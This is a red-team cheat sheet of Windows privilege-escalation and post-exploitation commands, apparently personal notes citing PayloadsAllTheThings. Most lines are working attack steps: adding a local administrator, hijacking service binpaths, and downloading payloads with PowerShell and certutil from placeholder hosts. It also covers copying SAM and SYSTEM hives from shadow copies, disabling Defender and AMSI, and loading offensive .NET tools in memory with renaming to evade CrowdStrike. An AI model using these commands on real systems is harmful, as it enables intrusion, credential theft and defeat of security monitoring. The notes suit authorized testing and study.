#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md


#check permissions of file
icacls C:\Users\myuser\poc.exe
#grant full permission on file to user:
icacls C:\Users\myuser\poc.exe /grant domain\user:F


#Add local user:
net user adminuser Password1234! /add
#Add user to local admins group:
net localgroup Administrators adminuser /add

#
systeminfo
whoami /groups
whoami /privs
wmic qfe
#Environment variables
set

#Services
sc query
sc qc <serviceName>
sc stop <serviceName>
sc start <serviceName>
sc create testService binpath= "C:\Windows\System32\cmd.exe" type= own type= interact
#disable startup service
shell sc config "scsrvc" start= disabled
#modify binpath of service
sc config <service name> binPath= <binary path>

#Registry autoruns
reg query HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run

#Scheduled tasks
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

#Set Powershell execution policy
powershell -ExecutionPolicy bypass

#Download files
#Powershell
(new-object net.webclient).downloadfile('http://whatever.com/file','C:\users\blah\Documents\file')
#Certutil
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

#list drivers
DRIVERQUERY /V

#list all files recursively
dir /b /a /s


#Needs admin rights

#Volume shadow copies
vssadmin list shadow
vssadmin create shadow /for=C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Users\user\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Users\user\

#Disable defender
# disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1


#Egress


# Arbitrary file delete to RCE
# https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks
#


#LOTL techniques
csvde.exe - import/export AD info through csv files
Volume shadow copy - NTDS.dit extraction
FRP - reverse proxy
certutil
dnscmd
ldifde
makecab
net user/group/use
netsh
nltest
ntdsutil
powershell
reg query/save
systeminfo
tasklist
wevtutil
wmic
xcopy


#AD Password policy
Get-ADDefaultDomainPasswordPolicy

#Query an object with powershell
$Group = [ADSI]"LDAP://CN=CGYMSDBP023,OU=Production,OU=Servers,DC=keyera,DC=com"
$Group

#LDAP Queries for red team engagements
#https://www.politoinc.com/post/ldap-queries-for-offensive-and-defensive-operations
$Filter="(cn=SERVERNAME)"
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=domain,DC=com")
$Searcher.Filter = $Filter
$res = $Searcher.FindAll()
$res.Properties


#Load .net assemblies in memory
#To avoid detection, replace the name of the utility everywhere in the code (works against Crowdstrike at least)
#documented here:
#https://github.com/GhostPack/Certify
#Create a base64 encoded version of .net binary
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
#Download or copy the base64 encoded string, then load into memory
$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
#Jump on the Module's entrypoint and provide arguments ("".Split() is necessary):
[Certify.Program]::Main("find /vulnerable".Split())
